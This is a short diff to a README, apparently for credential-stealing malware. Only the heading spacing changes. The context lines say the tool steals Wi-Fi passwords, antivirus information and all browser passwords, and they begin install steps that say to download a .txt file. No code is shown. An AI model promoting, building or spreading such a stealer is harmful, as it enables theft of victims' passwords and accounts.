@@ -1,8 +1,8 @@
-#what does it do? 
+# what does it do? 
 
 basically it st3als:Wi-Fi pas, anti virus info and browser pas(all) 
 
-#How to Install
+# How to Install
 
 1.Download the  .txt file
 
